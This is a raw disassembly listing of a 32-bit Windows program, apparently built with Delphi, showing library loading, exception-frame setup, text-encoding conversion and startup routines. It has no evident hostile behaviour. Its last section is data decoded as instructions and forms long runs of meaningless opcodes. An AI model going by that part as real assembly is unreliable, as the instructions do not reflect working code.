sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_40597c
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_40270c
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_40270c
jmp r-xdata
sub_4059dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_405a17
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_405a48
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_405aac
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4059dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405ab3
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_405ad0
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_405afc
test edx edx
je sub_405ab8
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_402848
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_405ba0
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call sub_401324
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_405bc8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_405ca4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
xor ecx ecx
mov cl [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
and edx 0xff
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
and edx 0xff
shl ecx 0x6
or edx ecx
mov ecx edx
sub_405ddc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405e7b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404118
mov eax ebx
xor edx edx
call sub_404970
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405e82
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov eax ebx
call sub_404964
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_404764
mov eax ebx
call sub_404964
push eax
mov eax [ ebp - 0x4 ]
call sub_4043d8
inc eax
push eax
mov eax ebx
call sub_404954
push eax
mov eax [ ebp - 0x4 ]
call sub_4045d8
pop ecx
pop edx
call sub_405bc8
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_404118
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_404764
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40416c
sub_405e88
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405f1f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4047f8
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405f26
lea eax [ ebp - 0x4 ]
call sub_4047f8
retn
mov eax ebx
call sub_4043d8
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_404a40
mov eax ebx
call sub_4043d8
push eax
mov eax [ ebp - 0x4 ]
call sub_404964
inc eax
push eax
mov eax ebx
call sub_4045d8
push eax
mov eax [ ebp - 0x4 ]
call sub_404954
pop ecx
pop edx
call sub_405ca4
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_4047f8
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_404a40
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404834
sub_405f2c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405f6f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404944
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_405ddc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405f76
lea eax [ ebp - 0x4 ]
call sub_4047f8
retn
sub_405f7c
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_404310
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_4054e8
push eax
call sub_4012bc
mov ecx eax
mov edx esp
mov eax esi
call sub_404208
jmp r-xdata
sub_405fd4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
push ebp
push sub_40603a
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0xb ]
push edx
push 0x1004
push eax
call sub_401284
lea eax [ ebp - 0x10 ]
lea edx [ ebp - 0xb ]
mov ecx 0x7
call sub_404388
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
call sub_402d20
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406041
lea eax [ ebp - 0x10 ]
call sub_404118
retn
xor ebx ebx
sub_406048
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406092
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406099
retn
mov eax rw-data
call sub_402b5c
mov eax rw-data
call sub_402b5c
mov eax rw-data
call sub_402b5c
call sub_401af0
sub_40609c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_404fdc
call sub_40315c
test al al
je r-xdata
call sub_403250
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_40133c
mov [ rw-data ] eax
call sub_401334
and eax 0x80000000
cmp eax 0x80000000
je r-xdata
call sub_40318c
call sub_4012ac
call sub_405fd4
mov [ rw-data ] eax
call sub_401334
and eax 0xff
cmp ax 0x4
jbe r-xdata
call sub_4012ac
call sub_405fd4
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] 0x3
jmp r-xdata
call sub_40132c
mov [ rw-data ] eax
sub_4061a4
push ebx
call sub_40619c
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_406190
test eax eax
jne r-xdata
mov eax 0xe2
call sub_404088
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_404088
sub_4061e8
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_4061a4
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_406234
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_406170
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_406228
mov edx rw-data
mov eax ebx
call sub_403ddc
pop ebx
retn
sub_406278
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40629d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4062a4
retn
sub_4062ec
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_406308
push ebx
mov ebx [ eax + 0x8 ]
mov ecx [ eax ]
sub ebx ecx
sar ebx 0x1
jns r-xdata
add ebx ecx
mov [ edx ] ebx
mov ebx [ eax + 0xc ]
mov ecx [ eax + 0x4 ]
sub ebx ecx
sar ebx 0x1
jns r-xdata
adc ebx 0x0
add ebx ecx
mov [ edx + 0x4 ] ebx
pop ebx
retn
adc ebx 0x0
sub_406334
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406359
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406360
retn
sub_40636e
inc eax
add [ ebx ] al
add ch [ esi ]
xor [ 0x0 ] eax
or al 0x0
add [ eax ] al
insb
arpl [ eax ] ax
or ch [ edi + 0x64 ]
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] ch
inc edi
jb r-xdata
jb r-xdata
jns r-xdata
xchg ebx eax
dec ecx
xor [ fs : ebx ] ecx
outsd
push edx
jae r-xdata
or ch [ fs : edi + 0x64 ]
inc esp
imul esi [ ebx + 0x61 ] 0x64656c62
or [ edi + 0x64 ] ebp
inc ebx
push 0x656b6365
or [ fs : edi + 0x64 ] ebp
inc esi
outsd
arpl [ ebp + 0x73 ] si
or [ fs : edi + 0x64 ] ebp
inc esp
popa
jne r-xdata
dec ecx
add [ ebx + 0x5c25ffc0 ] cl
jb r-xdata
jb r-xdata
je r-xdata
xchg ebx eax
dec ecx
add [ ebx + 0x5025ffc0 ] cl
xchg ebx eax
dec ecx
add [ ebx + 0x4c25ffc0 ] cl
xchg ebx eax
sar bh 0x25
push esp
xor cl [ fs : esi ]
outsd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
dec ecx
add [ ebx + 0x4825ffc0 ] cl
xchg ebx eax
dec ecx
add [ ebx + 0x4425ffc0 ] cl
xchg ebx eax
dec ecx
add [ ebx + 0x4025ffc0 ] cl
xchg ebx eax
dec ecx
add [ ebx + 0x3c25ffc0 ] cl
xchg ebx eax
dec ecx
add [ ebx + 0x3825ffc0 ] cl
xchg ebx eax
dec ecx
add [ ebx + 0x3425ffc0 ] cl
xchg ebx eax
dec ecx
add [ ebx + 0x3025ffc0 ] cl
xchg ebx eax
dec ecx
add [ ebx + 0x2c25ffc0 ] cl
xchg ebx eax
dec ecx
add [ ebx + 0x2825ffc0 ] cl
xchg ebx eax
dec ecx
add [ ebx + 0x2425ffc0 ] cl
xchg ebx eax
dec ecx
add [ ebx + 0x2025ffc0 ] cl
xchg ebx eax
dec ecx
add [ ebx + 0x1c25ffc0 ] cl
xchg ebx eax
dec ecx
add [ ebx + 0x1825ffc0 ] cl
xchg ebx eax
dec ecx
add [ ebx + 0x1425ffc0 ] cl
xchg ebx eax
dec ecx
add [ ebx + 0x1025ffc0 ] cl
xchg ebx eax
dec ecx
add [ ebx + 0xc25ffc0 ] cl
xchg ebx eax
dec ecx
add [ ebx + 0x825ffc0 ] cl
xchg ebx eax
dec ecx
add [ ebx + 0x425ffc0 ] cl
xchg ebx eax
dec ecx
add [ ebx + 0x25ffc0 ] cl
xchg ebx eax
dec ecx
add [ ebx - 0x3da0040 ] cl
xchg edx eax
dec ecx
add [ ebx - 0x7da0040 ] cl
xchg edx eax
dec ecx
add [ ebx - 0xbda0040 ] cl
xchg edx eax
dec ecx
add [ ebx - 0xfda0040 ] cl
xchg edx eax
dec ecx
add [ ebx - 0x13da0040 ] cl
xchg edx eax
dec ecx
add [ ebx - 0x17da0040 ] cl
xchg edx eax
dec ecx
add [ ebx - 0x1bda0040 ] cl
xchg edx eax
dec ecx
add [ ebx - 0x1fda0040 ] cl
xchg edx eax
dec ecx
add [ ebx - 0x23da0040 ] cl
xchg edx eax
dec ecx
add [ ebx - 0x27da0040 ] cl
xchg edx eax
dec ecx
add [ ebx - 0x2bda0040 ] cl
xchg edx eax
dec ecx
add [ ebx - 0x2fda0040 ] cl
xchg edx eax
dec ecx
add [ ebx - 0x33da0040 ] cl
xchg edx eax
dec ecx
add [ ebx - 0x37da0040 ] cl
xchg edx eax
dec ecx
add [ ebx - 0x3bda0040 ] cl
xchg edx eax
dec ecx
add [ ebx - 0x3fda0040 ] cl
xchg edx eax
dec ecx
add [ ebx - 0x43da0040 ] cl
xchg edx eax
dec ecx
add [ ebx - 0x47da0040 ] cl
xchg edx eax
dec ecx
add [ ebx - 0x4bda0040 ] cl
xchg edx eax
dec ecx
add [ ebx - 0x4fda0040 ] cl
xchg edx eax
dec ecx
add [ ebx - 0x53da0040 ] cl
xchg edx eax
dec ecx
add [ ebx - 0x57da0040 ] cl
xchg edx eax
dec ecx
add [ ebx - 0x5bda0040 ] cl
xchg edx eax
dec ecx
add [ ebx - 0x5fda0040 ] cl
xchg edx eax
dec ecx
add [ ebx - 0x63da0040 ] cl
xchg edx eax
dec ecx
add [ ebx - 0x67da0040 ] cl
xchg edx eax
dec ecx
add [ ebx - 0x6bda0040 ] cl
xchg edx eax
dec ecx
add [ ebx - 0x6fda0040 ] cl
xchg edx eax
dec ecx
add [ ebx - 0x73da0040 ] cl
xchg edx eax
dec ecx
add [ ebx - 0x77da0040 ] cl
xchg edx eax
dec ecx
add [ ebx - 0x7bda0040 ] cl
xchg edx eax
dec ecx
add [ ebx - 0x7fda0040 ] cl
xchg edx eax
dec ecx
add [ ebx + 0x7c25ffc0 ] cl
xchg edx eax
dec ecx
add [ ebx + 0x7825ffc0 ] cl
xchg edx eax
dec ecx
add [ ebx + 0x7425ffc0 ] cl
xchg edx eax
dec ecx
add [ ebx + 0x7025ffc0 ] cl
xchg edx eax
dec ecx
add [ ebx + 0x6c25ffc0 ] cl
xchg edx eax
dec ecx
add [ ebx + 0x6825ffc0 ] cl
xchg edx eax
dec ecx
add [ ebx + 0x6425ffc0 ] cl
xchg edx eax
dec ecx
add [ ebx + 0x6025ffc0 ] cl
xchg edx eax
dec ecx
add [ ebx + 0x5c25ffc0 ] cl
xchg edx eax
dec ecx
add [ ebx + 0x5825ffc0 ] cl
xchg edx eax
dec ecx
add [ ebx + 0x5425ffc0 ] cl
xchg edx eax
dec ecx
add [ ebx + 0x5025ffc0 ] cl
xchg edx eax
dec ecx
add [ ebx + 0x4c25ffc0 ] cl
xchg edx eax
dec ecx
add [ ebx + 0x4825ffc0 ] cl
xchg edx eax
dec ecx
add [ ebx + 0x4425ffc0 ] cl
xchg edx eax
dec ecx
add [ ebx + 0x4025ffc0 ] cl
xchg edx eax
dec ecx
add [ ebx + 0x3c25ffc0 ] cl
xchg edx eax
dec ecx
add [ ebx + 0x3825ffc0 ] cl
xchg edx eax
dec ecx
add [ ebx + 0x3425ffc0 ] cl
xchg edx eax
dec ecx
add [ ebx + 0x3025ffc0 ] cl
xchg edx eax
dec ecx
add [ ebx + 0x2c25ffc0 ] cl
xchg edx eax
dec ecx
add [ ebx + 0x7825ffc0 ] cl
xchg ebx eax
dec ecx
add [ ebx + 0x7425ffc0 ] cl
xchg ebx eax
dec ecx
add [ ebx + 0x7025ffc0 ] cl
xchg ebx eax
dec ecx
add [ ebx + 0x6825ffc0 ] cl
xchg esp eax
dec ecx
add [ ebx + 0x6425ffc0 ] cl
xchg esp eax
dec ecx
add [ ebx + 0x6025ffc0 ] cl
xchg esp eax
dec ecx
add [ ebx + 0x5c25ffc0 ] cl
xchg esp eax
dec ecx
add [ ebx + 0x5825ffc0 ] cl
xchg esp eax
dec ecx
add [ ebx + 0x5425ffc0 ] cl
xchg esp eax
dec ecx
add [ ebx + 0x5025ffc0 ] cl
xchg esp eax
dec ecx
add [ ebx + 0x4c25ffc0 ] cl
xchg esp eax
dec ecx
add [ ebx + 0x4825ffc0 ] cl
xchg esp eax
dec ecx
add [ ebx + 0x4425ffc0 ] cl
xchg esp eax
dec ecx
add [ ebx + 0x4025ffc0 ] cl
xchg esp eax
dec ecx
add [ ebx + 0x3c25ffc0 ] cl
xchg esp eax
dec ecx
add [ ebx + 0x3825ffc0 ] cl
xchg esp eax
dec ecx
add [ ebx + 0x3425ffc0 ] cl
xchg esp eax
dec ecx
add [ ebx + 0x3025ffc0 ] cl
xchg esp eax
dec ecx
add [ ebx + 0x2c25ffc0 ] cl
xchg esp eax
dec ecx
add [ ebx + 0x2825ffc0 ] cl
xchg esp eax
dec ecx
add [ ebx + 0x2425ffc0 ] cl
xchg esp eax
dec ecx
add [ ebx + 0x2025ffc0 ] cl
xchg esp eax
dec ecx
add [ ebx + 0x1c25ffc0 ] cl
xchg esp eax
dec ecx
add [ ebx + 0x1825ffc0 ] cl
xchg esp eax
dec ecx
add [ ebx + 0x1425ffc0 ] cl
xchg esp eax
dec ecx
add [ ebx + 0x1025ffc0 ] cl
xchg esp eax
dec ecx
add [ ebx + 0xc25ffc0 ] cl
xchg esp eax
dec ecx
add [ ebx + 0x825ffc0 ] cl
xchg esp eax
dec ecx
add [ ebx + 0x425ffc0 ] cl
xchg esp eax
dec ecx
add [ ebx + 0x25ffc0 ] cl
xchg esp eax
dec ecx
add [ ebx - 0x3da0040 ] cl
xchg ebx eax
dec ecx
add [ ebx - 0x7da0040 ] cl
xchg ebx eax
dec ecx
add [ ebx - 0xbda0040 ] cl
xchg ebx eax
dec ecx
add [ ebx - 0xfda0040 ] cl
xchg ebx eax
dec ecx
add [ ebx - 0x13da0040 ] cl
xchg ebx eax
dec ecx
add [ ebx - 0x17da0040 ] cl
xchg ebx eax
dec ecx
add [ ebx - 0x1bda0040 ] cl
xchg ebx eax
dec ecx
add [ ebx - 0x1fda0040 ] cl
xchg ebx eax
dec ecx
add [ ebx - 0x23da0040 ] cl
xchg ebx eax
dec ecx
add [ ebx - 0x27da0040 ] cl
xchg ebx eax
dec ecx
add [ ebx - 0x2bda0040 ] cl
xchg ebx eax
dec ecx
add [ ebx - 0x2fda0040 ] cl
xchg ebx eax
dec ecx
add [ ebx - 0x33da0040 ] cl
xchg ebx eax
dec ecx
add [ ebx - 0x37da0040 ] cl
xchg ebx eax
dec ecx
add [ ebx - 0x3bda0040 ] cl
xchg ebx eax
dec ecx
add [ ebx - 0x3fda0040 ] cl
xchg ebx eax
dec ecx
add [ ebx - 0x43da0040 ] cl
xchg ebx eax
dec ecx
add [ ebx - 0x47da0040 ] cl
xchg ebx eax
dec ecx
add [ ebx - 0x4bda0040 ] cl
xchg ebx eax
dec ecx
add [ ebx - 0x4fda0040 ] cl
xchg ebx eax
dec ecx
add [ ebx - 0x53da0040 ] cl
xchg ebx eax
dec ecx
add [ ebx - 0x57da0040 ] cl
xchg ebx eax
dec ecx
add [ ebx - 0x5bda0040 ] cl
xchg ebx eax
dec ecx
add [ ebx - 0x5fda0040 ] cl
xchg ebx eax
dec ecx
add [ ebx - 0x63da0040 ] cl
xchg ebx eax
dec ecx
add [ ebx - 0x67da0040 ] cl
xchg ebx eax
dec ecx
add [ ebx - 0x6bda0040 ] cl
xchg ebx eax
dec ecx
add [ ebx - 0x6fda0040 ] cl
xchg ebx eax
dec ecx
add [ ebx - 0x73da0040 ] cl
xchg ebx eax
dec ecx
add [ ebx - 0x77da0040 ] cl
xchg ebx eax
dec ecx
add [ ebx - 0x7bda0040 ] cl
xchg ebx eax
dec ecx
add [ ebx - 0x7fda0040 ] cl
xchg ebx eax
dec ecx
add [ ebx - 0x7da0040 ] cl
xchg esi eax
dec ecx
add [ ebx - 0xbda0040 ] cl
xchg esi eax
dec ecx
add [ ebx - 0x17da0040 ] cl
xchg esi eax
dec ecx
add [ ebx - 0x1fda0040 ] cl
xchg esi eax
dec ecx
add [ ebx - 0x23da0040 ] cl
xchg esi eax
dec ecx
add [ ebx - 0x27da0040 ] cl
xchg esi eax
dec ecx
add [ ebx - 0x2bda0040 ] cl
xchg esi eax
dec ecx
add [ ebx - 0x1bda0040 ] cl
xchg esi eax
dec ecx
add [ ebx - 0xfda0040 ] cl
xchg esi eax
dec ecx
add [ ebx - 0x13da0040 ] cl
xchg esi eax
dec ecx
add [ ebx - 0x2fda0040 ] cl
xchg esi eax
dec ecx
add [ ebx - 0x33da0040 ] cl
xchg esi eax
dec ecx
add [ ebx - 0x37da0040 ] cl
xchg esi eax
dec ecx
add [ ebx - 0x3bda0040 ] cl
xchg esi eax
dec ecx
add [ ebx - 0x3fda0040 ] cl
xchg esi eax
dec ecx
add [ ebx - 0x43da0040 ] cl
xchg esi eax
dec ecx
add [ ebx - 0x47da0040 ] cl
xchg esi eax
dec ecx
add [ ebx - 0x4bda0040 ] cl
xchg esi eax
dec ecx
add [ ebx - 0x4fda0040 ] cl
xchg esi eax
dec ecx
add [ ebx - 0x53da0040 ] cl
xchg esi eax
dec ecx
add [ ebx - 0x57da0040 ] cl
xchg esi eax
dec ecx
add [ ebx - 0x5bda0040 ] cl
xchg esi eax
dec ecx
add [ ebx - 0x5fda0040 ] cl
xchg esi eax
dec ecx
add [ ebx - 0x63da0040 ] cl
xchg esi eax
dec ecx
add [ ebx - 0x67da0040 ] cl
xchg esi eax
dec ecx
add [ ebx - 0x6bda0040 ] cl
xchg esi eax
dec ecx
add [ ebx - 0x6fda0040 ] cl
xchg esi eax
dec ecx
add [ ebx - 0x73da0040 ] cl
xchg esi eax
dec ecx
add [ ebx - 0x77da0040 ] cl
xchg esi eax
dec ecx
add [ ebx - 0x7bda0040 ] cl
xchg esi eax
dec ecx
add [ ebx - 0x7fda0040 ] cl
xchg esi eax
dec ecx
add [ ebx + 0x7c25ffc0 ] cl
xchg esi eax
dec ecx
add [ ebx + 0x7825ffc0 ] cl
xchg esi eax
dec ecx
add [ ebx + 0x7425ffc0 ] cl
xchg esi eax
dec ecx
add [ ebx + 0x7025ffc0 ] cl
xchg esi eax
dec ecx
add [ ebx + 0x6c25ffc0 ] cl
xchg esi eax
dec ecx
add [ ebx + 0x6825ffc0 ] cl
xchg esi eax
dec ecx
add [ ebx + 0x6425ffc0 ] cl
xchg esi eax
dec ecx
add [ ebx + 0x6025ffc0 ] cl
xchg esi eax
dec ecx
add [ ebx + 0x5c25ffc0 ] cl
xchg esi eax
dec ecx
add [ ebx + 0x5825ffc0 ] cl
xchg esi eax
dec ecx
add [ ebx + 0x5425ffc0 ] cl
xchg esi eax
dec ecx
add [ ebx + 0x5025ffc0 ] cl
xchg esi eax
dec ecx
add [ ebx + 0x4c25ffc0 ] cl
xchg esi eax
dec ecx
add [ ebx + 0x4825ffc0 ] cl
xchg esi eax
dec ecx
add [ ebx + 0x4425ffc0 ] cl
xchg esi eax
dec ecx
add [ ebx + 0x4025ffc0 ] cl
xchg esi eax
dec ecx
add [ ebx + 0x3c25ffc0 ] cl
xchg esi eax
dec ecx
